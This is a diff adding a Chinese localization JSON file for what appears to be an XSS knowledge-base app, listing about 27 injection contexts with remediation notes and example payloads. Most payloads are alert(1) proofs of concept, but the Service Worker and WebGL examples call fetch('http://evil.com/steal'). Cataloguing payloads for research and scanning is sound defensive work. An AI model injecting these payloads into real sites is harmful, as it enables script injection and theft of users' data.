@@ -1,0 +1,331 @@
+{
+  "app": {
+    "name": "BRS-KB XSS 知识库",
+    "description": "高级 XSS 情报数据库，用于研究人员和扫描器",
+    "version": "版本",
+    "loading": "加载中...",
+    "error": "错误",
+    "success": "成功",
+    "warning": "警告",
+    "info": "信息"
+  },
+  "navigation": {
+    "home": "主页",
+    "contexts": "上下文",
+    "payloads": "有效载荷",
+    "playground": "游乐场",
+    "dashboard": "仪表板",
+    "api_docs": "API 文档"
+  },
+  "contexts": {
+    "title": "XSS 漏洞上下文",
+    "description": "探索不同的 XSS 漏洞上下文，包含详细的攻击向量和修复策略。",
+    "severity": "严重性",
+    "cvss_score": "CVSS 评分",
+    "description": "描述",
+    "attack_vector": "攻击向量",
+    "remediation": "修复",
+    "examples": "示例",
+    "payload_count": "Payload 数量"
+  },
+  "context_details": {
+    "html_content": {
+      "title": "HTML内容中的跨站脚本(XSS)",
+      "description": "用户输入直接反映到HTML主体中而没有适当的清理...",
+      "attack_vector": "经典攻击向量：\n\n1. 脚本标签注入：\n   <script>alert(document.cookie)</script>...",
+      "remediation": "深度防御策略：\n\n1. 输出编码（主要防御）：\n   HTML实体编码...",
+      "examples": [
+        {"name": "基本脚本", "payload": "<script>alert('XSS')</script>"},
+        {"name": "图像错误", "payload": "<img src=x onerror=alert(1)>"}
+      ]
+    },
+    "websocket_xss": {
+      "title": "WebSocket上下文中的跨站脚本(XSS)",
+      "description": "WebSocket XSS发生在用户输入反映到WebSocket消息中...",
+      "attack_vector": "WEBSOCKET XSS攻击向量：\n\n1. 消息注入：\n   服务器发送：ws.send(userMessage)...",
+      "remediation": "WEBSOCKET XSS防御策略：\n\n1. 消息清理：\n   清理所有传出的WebSocket消息...",
+      "examples": [
+        {"name": "聊天消息", "payload": "{\"type\": \"chat\", \"message\": \"<script>alert(1)</script>\"}"},
+        {"name": "用户名", "payload": "{\"type\": \"user_joined\", \"username\": \"<script>alert(1)</script>\"}"}
+      ]
+    },
+    "service_worker_xss": {
+      "title": "Service Worker上下文中的跨站脚本(XSS)",
+      "description": "Service Worker XSS发生在用户输入反映到Service Worker脚本中...",
+      "attack_vector": "SERVICE WORKER XSS攻击向量：\n\n1. 动态注册：\n   navigator.serviceWorker.register('/sw.js?user=' + USER_INPUT)...",
+      "remediation": "SERVICE WORKER XSS防御策略：\n\n1. URL验证：\n   验证Service Worker注册URL...",
+      "examples": [
+        {"name": "缓存注入", "payload": "data:text/javascript,self.addEventListener(\"install\",function(){fetch(\"http://evil.com/steal\")})"},
+        {"name": "离线XSS", "payload": "data:text/html,<script>alert(1)</script>"}
+      ]
+    },
+    "webrtc_xss": {
+      "title": "WebRTC上下文中的跨站脚本(XSS)",
+      "description": "WebRTC XSS发生在用户输入反映到WebRTC数据通道中...",
+      "attack_vector": "WEBRTC XSS攻击向量：\n\n1. 数据通道注入：\n   WebRTC data channel: dataChannel.send(JSON.stringify({...",
+      "remediation": "WEBRTC XSS防御策略：\n\n1. 数据通道验证：\n   验证数据通道消息...",
+      "examples": [
+        {"name": "聊天消息", "payload": "{\"type\": \"chat\", \"message\": \"<script>alert(1)</script>\"}"},
+        {"name": "对等信息", "payload": "{\"type\": \"peer_info\", \"name\": \"<script>alert(1)</script>\"}"}
+      ]
+    },
+    "graphql_xss": {
+      "title": "GraphQL上下文中的跨站脚本(XSS)",
+      "description": "GraphQL XSS发生在用户输入反映到GraphQL查询中...",
+      "attack_vector": "GRAPHQL XSS攻击向量：\n\n1. 查询参数注入：\n   query GetUser($id: ID!) { user(id: $id) {...",
+      "remediation": "GRAPHQL XSS防御策略：\n\n1. 输入验证：\n   验证所有GraphQL输入...",
+      "examples": [
+        {"name": "GraphQL查询", "payload": "query { user(id: \"<script>alert(1)</script>\") { name } }"},
+        {"name": "GraphQL变异", "payload": "mutation { updateProfile(input: { displayName: \"<script>alert(1)</script>\" }) { success } }"}
+      ]
+    },
+    "shadow_dom_xss": {
+      "title": "Shadow DOM上下文中的跨站脚本(XSS)",
+      "description": "Shadow DOM XSS发生在用户输入反映到Shadow DOM元素中...",
+      "attack_vector": "SHADOW DOM XSS攻击向量：\n\n1. 槽内容注入：\n   <user-profile><span slot=\"name\">USER_INPUT</span></user-profile>",
+      "remediation": "SHADOW DOM XSS防御策略：\n\n1. 内容清理：\n   清理所有插入Shadow DOM的内容...",
+      "examples": [
+        {"name": "Shadow DOM槽", "payload": "<span slot=\"content\"><script>alert(1)</script></span>"},
+        {"name": "Shadow DOM属性", "payload": "<my-component title=\"<script>alert(1)</script>\"></my-component>"}
+      ]
+    },
+    "custom_elements_xss": {
+      "title": "自定义元素上下文中的跨站脚本(XSS)",
+      "description": "自定义元素XSS发生在用户输入反映到自定义元素中...",
+      "attack_vector": "CUSTOM ELEMENTS XSS攻击向量：\n\n1. 元素名注入：\n   customElements.define(USER_INPUT, MyComponent)...",
+      "remediation": "CUSTOM ELEMENTS XSS防御策略：\n\n1. 元素名验证：\n   验证自定义元素名称...",
+      "examples": [
+        {"name": "元素名", "payload": "<script>alert(1)</script>"},
+        {"name": "元素属性", "payload": "<my-component data-value='<script>alert(1)</script>'></my-component>"}
+      ]
+    },
+    "http2_push_xss": {
+      "title": "HTTP/2推送上下文中的跨站脚本(XSS)",
+      "description": "HTTP/2推送XSS发生在用户输入反映到HTTP/2推送资源中...",
+      "attack_vector": "HTTP/2 PUSH XSS攻击向量：\n\n1. 推送路径注入：\n   server.push('/api/user/' + USER_INPUT)...",
+      "remediation": "HTTP/2 PUSH XSS防御策略：\n\n1. 推送路径验证：\n   验证所有推送路径...",
+      "examples": [
+        {"name": "推送路径", "payload": "/api/user/<script>alert(1)</script>"},
+        {"name": "推送内容", "payload": "var userName = \"<script>alert(1)</script>\";"}
+      ]
+    },
+    "iframe_sandbox_xss": {
+      "title": "iframe沙箱上下文中的跨站脚本(XSS)",
+      "description": "iframe沙箱XSS发生在沙箱限制被绕过时...",
+      "attack_vector": "IFRAME SANDBOX XSS攻击向量：\n\n1. 不完整沙箱：\n   <iframe src=\"USER_CONTENT\" sandbox=\"allow-scripts\"></iframe>...",
+      "remediation": "IFRAME SANDBOX XSS防御策略：\n\n1. 严格沙箱：\n   使用严格的沙箱策略...",
+      "examples": [
+        {"name": "数据URI", "payload": "<iframe src='data:text/html,<script>alert(1)</script>' sandbox='allow-scripts'></iframe>"},
+        {"name": "同源", "payload": "<iframe src='/same-origin' sandbox='allow-same-origin allow-scripts'></iframe>"}
+      ]
+    },
+    "indexeddb_xss": {
+      "title": "IndexedDB上下文中的跨站脚本(XSS)",
+      "description": "IndexedDB XSS发生在用户输入反映到IndexedDB存储中...",
+      "attack_vector": "INDEXEDDB XSS攻击向量：\n\n1. 存储注入：\n   store.add({id: userId, name: USER_INPUT})...",
+      "remediation": "INDEXEDDB XSS防御策略：\n\n1. 存储清理：\n   清理所有存储前的数据...",
+      "examples": [
+        {"name": "用户配置文件", "payload": "{\"name\": \"<script>alert(1)</script>\", \"email\": \"test@example.com\"}"},
+        {"name": "消息存储", "payload": "{\"content\": \"<script>alert(1)</script>\", \"type\": \"text\"}"}
+      ]
+    },
+    "webgl_xss": {
+      "title": "WebGL上下文中的跨站脚本(XSS)",
+      "description": "WebGL XSS发生在用户输入反映到WebGL着色器中...",
+      "attack_vector": "WEBGL XSS攻击向量：\n\n1. 着色器注入：\n   const vertexShaderSource = 'attribute vec4 aVertexPosition; ' + USER_INPUT...",
+      "remediation": "WEBGL XSS防御策略：\n\n1. 着色器验证：\n   验证所有着色器代码...",
+      "examples": [
+        {"name": "顶点着色器", "payload": "gl_Position = uModelViewMatrix * aVertexPosition; alert(1);"},
+        {"name": "片段着色器", "payload": "gl_FragColor = vec4(0.0, 1.0, 0.0, 1.0); fetch('http://evil.com/steal')"}
+      ]
+    },
+    "css_context": {
+      "title": "CSS上下文中的跨站脚本(XSS)",
+      "description": "CSS XSS发生在用户输入反映到CSS样式中...",
+      "attack_vector": "CSS XSS攻击向量：\n\n1. CSS表达式：\n   expression(alert(1))...",
+      "remediation": "CSS XSS防御策略：\n\n1. CSS验证：\n   验证所有CSS属性...",
+      "examples": [
+        {"name": "CSS表达式", "payload": "expression(alert(1))"},
+        {"name": "CSS URL", "payload": "background:url('javascript:alert(1)')"}
+      ]
+    },
+    "svg_context": {
+      "title": "SVG上下文中的跨站脚本(XSS)",
+      "description": "SVG XSS发生在用户输入反映到SVG元素中...",
+      "attack_vector": "SVG XSS攻击向量：\n\n1. SVG onload：\n   <svg onload=alert(1)>...",
+      "remediation": "SVG XSS防御策略：\n\n1. SVG清理：\n   清理所有SVG元素...",
+      "examples": [
+        {"name": "SVG onload", "payload": "<svg onload=alert(1)>"},
+        {"name": "SVG脚本", "payload": "<svg><script>alert(1)</script></svg>"}
+      ]
+    },
+    "markdown_context": {
+      "title": "Markdown上下文中的跨站脚本(XSS)",
+      "description": "Markdown XSS发生在用户输入反映到Markdown渲染中...",
+      "attack_vector": "MARKDOWN XSS攻击向量：\n\n1. Markdown链接：\n   [XSS](javascript:alert(1))...",
+      "remediation": "MARKDOWN XSS防御策略：\n\n1. Markdown清理：\n   清理所有Markdown元素...",
+      "examples": [
+        {"name": "Markdown链接", "payload": "[XSS](javascript:alert(1))"},
+        {"name": "Markdown图像", "payload": "![XSS](javascript:alert(1))"}
+      ]
+    },
+    "json_value": {
+      "title": "JSON上下文中的跨站脚本(XSS)",
+      "description": "JSON XSS发生在用户输入反映到JSON数据中...",
+      "attack_vector": "JSON XSS攻击向量：\n\n1. JSON注入：\n   {\"user\": \"<script>alert(1)</script>\"}...",
+      "remediation": "JSON XSS防御策略：\n\n1. JSON验证：\n   验证所有JSON数据...",
+      "examples": [
+        {"name": "JSON值", "payload": "{\"user\": \"<script>alert(1)</script>\"}"},
+        {"name": "JSON对象", "payload": "{\"data\": \"<script>alert(1)</script>\"}"}
+      ]
+    },
+    "xml_content": {
+      "title": "XML上下文中的跨站脚本(XSS)",
+      "description": "XML XSS发生在用户输入反映到XML数据中...",
+      "attack_vector": "XML XSS攻击向量：\n\n1. XML注入：\n   <user><name><script>alert(1)</script></name></user>...",
+      "remediation": "XML XSS防御策略：\n\n1. XML清理：\n   清理所有XML元素...",
+      "examples": [
+        {"name": "XML内容", "payload": "<user><name><script>alert(1)</script></name></user>"},
+        {"name": "XML CDATA", "payload": "<content><![CDATA[<script>alert(1)</script>]]></content>"}
+      ]
+    },
+    "url_context": {
+      "title": "URL上下文中的跨站脚本(XSS)",
+      "description": "URL XSS发生在用户输入反映到URL中...",
+      "attack_vector": "URL XSS攻击向量：\n\n1. JavaScript协议：\n   javascript:alert(1)...",
+      "remediation": "URL XSS防御策略：\n\n1. URL验证：\n   验证所有URL参数...",
+      "examples": [
+        {"name": "JavaScript协议", "payload": "javascript:alert(1)"},
+        {"name": "数据URI", "payload": "data:text/html,<script>alert(1)</script>"}
+      ]
+    },
+    "dom_xss": {
+      "title": "DOM上下文中的跨站脚本(XSS)",
+      "description": "DOM XSS发生在用户输入反映到DOM中...",
+      "attack_vector": "DOM XSS攻击向量：\n\n1. 位置哈希：\n   location.hash...",
+      "remediation": "DOM XSS防御策略：\n\n1. DOM验证：\n   验证所有DOM操作...",
+      "examples": [
+        {"name": "位置哈希", "payload": "location.hash"},
+        {"name": "文档URL", "payload": "document.URL"}
+      ]
+    },
+    "template_injection": {
+      "title": "模板注入上下文中的跨站脚本(XSS)",
+      "description": "模板注入XSS发生在用户输入反映到模板中...",
+      "attack_vector": "模板注入XSS攻击向量：\n\n1. 模板沙箱逃逸：\n   {{constructor.constructor('alert(1)')()}}...",
+      "remediation": "模板注入XSS防御策略：\n\n1. 模板沙箱：\n   使用模板沙箱...",
+      "examples": [
+        {"name": "模板注入", "payload": "{{constructor.constructor('alert(1)')()}}"},
+        {"name": "Angular注入", "payload": "{{7*7}}"}
+      ]
+    },
+    "postmessage_xss": {
+      "title": "PostMessage上下文中的跨站脚本(XSS)",
+      "description": "PostMessage XSS发生在用户输入反映到PostMessage API中...",
+      "attack_vector": "POSTMESSAGE XSS攻击向量：\n\n1. 消息注入：\n   postMessage(userInput, '*')...",
+      "remediation": "POSTMESSAGE XSS防御策略：\n\n1. 消息验证：\n   验证所有PostMessage数据...",
+      "examples": [
+        {"name": "PostMessage数据", "payload": "{\"type\": \"message\", \"data\": \"<script>alert(1)</script>\"}"},
+        {"name": "PostMessage来源", "payload": "{\"source\": \"javascript:alert(1)\", \"data\": \"message\"}"}
+      ]
+    },
+    "wasm_context": {
+      "title": "WebAssembly上下文中的跨站脚本(XSS)",
+      "description": "WebAssembly XSS发生在用户输入反映到WebAssembly代码中...",
+      "attack_vector": "WASM XSS攻击向量：\n\n1. WASM注入：\n   (module (func $xss (export \"xss\") (call $alert)))...",
+      "remediation": "WASM XSS防御策略：\n\n1. WASM验证：\n   验证所有WebAssembly代码...",
+      "examples": [
+        {"name": "WASM导入", "payload": "(import \"env\" \"alert\" (func $alert))"},
+        {"name": "WASM全局", "payload": "(global $xss (mut i32) (i32.const 0)) (export \"xss\" (global $xss))"}
+      ]
+    },
+    "html_attribute": {
+      "title": "HTML属性上下文中的跨站脚本(XSS)",
+      "description": "HTML属性XSS发生在用户输入反映到HTML属性中...",
+      "attack_vector": "HTML ATTRIBUTE XSS攻击向量：\n\n1. 属性注入：\n   <div data-text=\"USER_INPUT\">...</div>...",
+      "remediation": "HTML ATTRIBUTE XSS防御策略：\n\n1. 属性编码：\n   编码所有HTML属性...",
+      "examples": [
+        {"name": "属性突破", "payload": "\"><script>alert(1)</script>"},
+        {"name": "图像onerror", "payload": "<img src=x onerror=alert(1)>"}
+      ]
+    },
+    "html_comment": {
+      "title": "HTML注释上下文中的跨站脚本(XSS)",
+      "description": "HTML注释XSS发生在用户输入反映到HTML注释中...",
+      "attack_vector": "HTML COMMENT XSS攻击向量：\n\n1. 注释突破：\n   <!-- USER_INPUT -->...",
+      "remediation": "HTML COMMENT XSS防御策略：\n\n1. 注释清理：\n   清理所有HTML注释...",
+      "examples": [
+        {"name": "注释突破", "payload": "--><script>alert(1)</script><!--"},
+        {"name": "条件注释", "payload": "<!--[if IE]><script>alert(1)</script><![endif]-->"}
+      ]
+    },
+    "javascript_context": {
+      "title": "JavaScript上下文中的跨站脚本(XSS)",
+      "description": "JavaScript Context XSS发生在用户输入注入到JavaScript代码中...",
+      "attack_vector": "JAVASCRIPT CONTEXT XSS攻击向量：\n\n1. 变量注入：\n   var data = USER_INPUT;...",
+      "remediation": "JAVASCRIPT CONTEXT XSS防御策略：\n\n1. JSON序列化：\n   使用JSON序列化JavaScript变量...",
+      "examples": [
+        {"name": "变量注入", "payload": "1; alert(document.cookie); var x=1"},
+        {"name": "函数注入", "payload": "1); alert(1); doSomething(1"}
+      ]
+    },
+    "js_string": {
+      "title": "JavaScript字符串上下文中的跨站脚本(XSS)",
+      "description": "JavaScript String XSS发生在用户输入反映到JavaScript字符串中...",
+      "attack_vector": "JS STRING XSS攻击向量：\n\n1. 字符串连接：\n   var message = 'Hello ' + USER_INPUT...",
+      "remediation": "JS STRING XSS防御策略：\n\n1. 字符串编码：\n   编码所有JavaScript字符串...",
+      "examples": [
+        {"name": "字符串连接", "payload": "' + alert(1) + '"},
+        {"name": "模板字面量", "payload": "`${alert(1)}`"}
+      ]
+    },
+    "js_object": {
+      "title": "JavaScript对象上下文中的跨站脚本(XSS)",
+      "description": "JavaScript Object XSS发生在用户输入反映到JavaScript对象中...",
+      "attack_vector": "JS OBJECT XSS攻击向量：\n\n1. 对象属性注入：\n   var config = {value: USER_INPUT}...",
+      "remediation": "JS OBJECT XSS防御策略：\n\n1. 对象验证：\n   验证所有对象属性...",
+      "examples": [
+        {"name": "对象属性", "payload": "1, alert: alert(1), real: 1"},
+        {"name": "对象注入", "payload": "null}; alert(1); var config = {value: null"}
+      ]
+    },
+    "default": {
+      "title": "跨站脚本(XSS)漏洞",
+      "description": "关于XSS漏洞的一般信息...",
+      "attack_vector": "通用XSS攻击向量：\n\n1. 脚本注入：\n   <script>alert('XSS')</script>...",
+      "remediation": "通用XSS防御策略：\n\n1. 输入验证：\n   验证所有输入数据...",
+      "examples": [
+        {"name": "基本XSS", "payload": "<script>alert('XSS')</script>"},
+        {"name": "图像XSS", "payload": "<img src=x onerror=alert(1)>"}
+      ]
+    }
+  },
+  "common": {
+    "loading": "加载中...",
+    "error": "错误",
+    "success": "成功",
+    "warning": "警告",
+    "info": "信息",
+    "search": "搜索",
+    "filter": "过滤",
+    "clear": "清除",
+    "export": "导出",
+    "import": "导入",
+    "save": "保存",
+    "cancel": "取消",
+    "confirm": "确认",
+    "yes": "是",
+    "no": "否",
+    "total": "总计",
+    "contexts": "上下文",
+    "payloads": "有效载荷",
+    "severity": "严重性",
+    "cvss_score": "CVSS 评分",
+    "description": "描述",
+    "attack_vector": "攻击向量",
+    "remediation": "修复",
+    "examples": "示例",
+    "payload_count": "Payload 数量"
+  }
+}
+
